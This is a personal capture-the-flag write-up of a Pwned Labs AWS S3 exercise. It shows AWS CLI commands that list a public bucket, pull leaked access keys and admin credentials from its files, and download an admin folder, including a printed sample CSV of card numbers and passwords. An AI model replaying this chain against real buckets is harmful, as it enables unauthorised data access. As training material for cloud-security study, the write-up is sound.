### Lab - 1 AWS S3 Enumeration Basics
Link : https://pwnedlabs.io/labs/aws-s3-enumeration-basics
PoC : 
S1 - Check for contents in S3 Bucket.
```
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 ls s3://dev.huge-logistics.com --no-sign-request 
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 22:30:47       5347 index.html
```

> `aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive` : This particular command helps to list all the files present in the directories

```
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request                
2023-10-16 20:38:33          0 
2023-10-16 20:39:01        993 hl_migration_project.zip
 
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request 
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip
  
┌──(shibushivansh㉿shibu)-[~]
└─$ ls
 Android         BuiltAndroidApps                   ctf-backend   Downloads       hl_migration_project.zip   Laptop_Photos     Music              Pictures                'React2Shell Vulnerability.pdf'   server      Videos
 Angad_Product   Built-Pipeline.apk                 Desktop       Findings        hs                         LLMProject        phew_server.zip    PortswiggerLabsContent  'Requirement Gathering.txt'       snap       'VirtualBox VMs'
 ApkProjects     BurpSuite_profissional_v2025.1.4   Documents    'Frame 78.png'   LaptopData                 MediumResources   PhishingCampaign   Public                   Scripts                          Templates
                                    
┌──(shibushivansh㉿shibu)-[~]
└─$ unzip hl_migration_project.zip 
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1     

┌──(shibushivansh㉿shibu)-[~]
└─$ ls
 Android         BuiltAndroidApps                   ctf-backend   Downloads       hl_migration_project.zip   Laptop_Photos     migrate_secrets.ps1   PhishingCampaign         Public                           Scripts   Templates
 Angad_Product   Built-Pipeline.apk                 Desktop       Findings        hs                         LLMProject        Music                 Pictures                'React2Shell Vulnerability.pdf'   server    Videos
 ApkProjects     BurpSuite_profissional_v2025.1.4   Documents    'Frame 78.png'   LaptopData                 MediumResources   phew_server.zip       PortswiggerLabsContent  'Requirement Gathering.txt'       snap     'VirtualBox VMs'
```

![[Pasted image 20251218130438.png]]
![[Pasted image 20251218130500.png]]

And now using the Access Token and Shared Token, we can simply configure this to our profile.

But even after configuring this profile, we are unable to download the flag present in the /admin/ directory of the S3 Bucket.

```
┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 ls --profile s3_enum_flag s3://dev.huge-logistics.com --recursive 
2023-10-16 20:38:38          0 admin/
2024-12-02 20:27:44         32 admin/flag.txt
2023-10-17 01:54:07       2425 admin/website_transactions_export.csv
2023-10-16 22:30:47       5347 index.html
2023-10-16 20:38:47          0 migration-files/
2023-10-16 20:39:26    1833646 migration-files/AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 20:39:25    1407180 migration-files/AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 20:39:27       1853 migration-files/migrate_secrets.ps1
2023-10-16 23:30:13       2494 migration-files/test-export.xml
2023-10-16 20:38:33          0 shared/
2023-10-16 20:39:01        993 shared/hl_migration_project.zip
2023-10-16 20:38:26          0 static/
2023-10-16 22:22:30      54451 static/logo.png
2023-10-16 22:22:30        183 static/script.js
2023-10-16 22:22:31       9259 static/style.css

┌──(shibushivansh㉿shibu)-[~]
└─$ aws s3 cp --profile s3_enum_flag s3://dev.huge-logistics.com/admin/flag.txt . 
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

![[Pasted image 20251218131509.png]]
Now, here we downloaded the directory files from migration-files.
![[Pasted image 20251218131915.png]]

And now here we have received the credentials of IT Admin from the migration-files/test-exports.xml
![[Pasted image 20251218132352.png]]

And on logging in the with these credentials : 
```
┌──(shibushivansh㉿shibu)-[~/pwnedlabs/AWSS3_Enumeration_Basics]
└─$ aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv . --profile pwned_s3_enum
download: s3://dev.huge-logistics.com/admin/website_transactions_export.csv to ./website_transactions_export.csv
                                                                                                                                                              
┌──(shibushivansh㉿shibu)-[~/pwnedlabs/AWSS3_Enumeration_Basics]
└─$ ls
migrate_secrets.ps1  test-export.xml  website_transactions_export.csv
                                                                                                                                                              
┌──(shibushivansh㉿shibu)-[~/pwnedlabs/AWSS3_Enumeration_Basics]
└─$ cat website_transactions_export.csv                                         
network,credit_card_number,cvv,expiry_date,card_holder_name,validation,username,password,ip_address
Visa,4055497191304,386,5/2021,Hunter Miller,,hunter_m,password123,34.56.78.90
Visa,4055491339081,492,8/2021,Jayden Adams,,jay_adams,jayden2023,157.89.34.56
Visa,4055491511051,244,10/2025,Jose Baker,,joseBaker24,jose@pass,212.45.67.89
Visa,4313504070320,984,3/2025,Gabriel Phillips,,gabrielP,welcome2025,58.67.34.23
Visa,4313504750869252,522,5/2024,Joseph Thomas,,joethomas,joe!pass,94.23.45.67
Visa,4313501801459893,585,5/2021,Chloe Nelson,,chloe_n,summer21,71.23.45.89
Visa,4313506927832,748,4/2025,Brianna Brown,,briBrown,ilovebri,102.178.23.45
Visa,4313508703687539,854,9/2021,Jose Perez,,jperez,jose*pass,145.89.23.67
Visa,4055490538100206,903,2/2022,Brooklyn Davis,,brookD,cookie22,89.45.23.56
Visa,4055496324021,989,10/2024,Elijah Davis,,elijahD2024,honey24,132.56.78.90
Visa,4313507611385,798,10/2025,Jose Davis,,josed_25,chocolate,193.45.67.80
Visa,4313505844566770,391,10/2023,Anna Miller,,annaM,anna2023,144.68.90.10
Visa,4313503045245021,319,9/2022,Anthony Collins,,tony_collins,tony!pass,154.23.67.89
Visa,4313503967294,839,7/2023,Alyssa Thompson,,alyssaT23,thompson23,212.67.89.90
Visa,4055496654879978,242,10/2023,Gabriel Garcia,,garcia_gabe,letmein,148.12.67.34
Visa,4313502893954,923,7/2025,Noah Allen,,noah_allen25,password2025,178.45.23.12
Visa,4055497065912,770,9/2021,Hunter Anderson,,hunterA2021,winter21,165.89.34.12
Visa,4055499869808,492,8/2025,David Jackson,,djackson,trustno1,194.56.78.90
Visa,4055493603013,993,3/2023,Katherine Anderson,,kat_anderson,love2023,204.89.23.45
Visa,4313507735369298,267,3/2021,Aiden Jones,,aidenJ,aiden@logistics,168.90.23.67
Visa,4055490830817,631,1/2023,Etha Nelson,,ethaN,etha@2023,132.78.90.10
Visa,4055492037879157,235,10/2024,Katherine Martin,,k_martin,superpass,178.89.23.45
Visa,4055490511326,802,3/2025,Elijah Scott,,elijahS2025,summer25,212.34.56.78
Visa,4313507927120,620,8/2022,Julia Brown,,juliaB22,julia@logis,189.23.45.67
Visa,4055498615148980,916,4/2024,Jose Jones,,j_jones24,jose2024,178.56.78.90
Visa,4313502314852,986,6/2024,Samantha Thompso,,samanthaT,samantha2024,167.89.90.12
Visa,4055491551140558,357,2/2023,Elizabeth Nelson,,lizNelson,princess23,204.56.78.12
Visa,4055496059868048,722,3/2025,Grace Brown,,graceB25,charlie1,156.78.90.12
Visa,4313508490261548,894,7/2025,Landon Adams,,landonA,landon@logis,146.78.90.23                                                                                                                                                              
┌──(shibushivansh㉿shibu)-[~/pwnedlabs/AWSS3_Enumeration_Basics]
└─$ aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile pwned_s3_enum
download: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt
                              
┌──(shibushivansh㉿shibu)-[~/pwnedlabs/AWSS3_Enumeration_Basics]
└─$ cat flag.txt                       
<answer-key>
```

